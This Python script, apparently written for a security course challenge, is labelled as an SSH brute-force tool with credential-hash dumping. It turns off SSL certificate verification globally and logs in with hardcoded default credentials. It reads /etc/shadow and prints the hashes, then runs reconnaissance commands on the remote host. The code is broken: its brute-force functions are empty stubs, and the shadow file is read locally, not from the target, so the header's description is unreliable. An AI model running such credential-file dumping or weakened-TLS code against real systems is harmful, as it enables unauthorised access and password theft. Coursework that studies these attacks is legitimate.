#!/usr/bin/env python3

# Script name: Challenge: 401 Challenge 17
# Author: Christen Reinhart
# Date of Latest Revision: 01/30/2024
# Sources: https://chat.openai.com/share/10b196e4-6aa3-4072-b3be-8d3d7cddc1a9
# Purpose: In Python, Python brute force tool with the capability to dump user credential hashes

import ssl
import nltk
import time
import paramiko  # need pip install
import getpass
import hashlib  # Import for hash dumping

from nltk.corpus import words

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

def get_words():
    # Implement this function to retrieve a list of words for brute-forcing
    pass

def check_for_words(words):
    # Implement this function to check if certain words are present
    pass

def load_external_file():
    # Implement this function to load words from an external file
    pass

def get_host():
    host = input('Enter an SSH Client to connect to or enter for default: ') or "192.168.0.140"
    return host

def get_user():
    user = input("Enter a username or enter for default: ") or "donniedarko"
    return user

def get_password():
    password = getpass.getpass(prompt="Please provide a password:") or "password4321"
    return password

def ssh_client():
    port = 22
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(get_host(), port, get_user(), get_password())

        # Dump credential hashes (example, modify as needed)
        with open('/etc/shadow', 'r') as shadow_file:
            shadow_lines = shadow_file.readlines()
            for line in shadow_lines:
                username, password_hash = line.split(':')[0:2]
                print(f"{username}: {password_hash}")

        stdin, stdout, stderr = ssh.exec_command("whoami")
        time.sleep(3)
        output = stdout.read().decode()  # Decode bytes to string
        print("-" * 50)
        print(output)
        stdin, stdout, stderr = ssh.exec_command("ls -l")
        time.sleep(3)
        output = stdout.read().decode()  # Decode bytes to string
        print(output)
        stdin, stdout, stderr = ssh.exec_command("uptime")
        time.sleep(3)
        output = stdout.read().decode()  # Decode bytes to string
        print(output)
        print("-" * 50)

    except paramiko.AuthenticationException as e:
        print("Authentication Failed!")
        print(e)

    ssh.close()

if __name__ == "__main__":
    external_words = get_words()  # Implement this function
    # print(external_words)
    # print(word list)
    # check_for_word(external_words)
    # load_external_file()
    ssh_client()
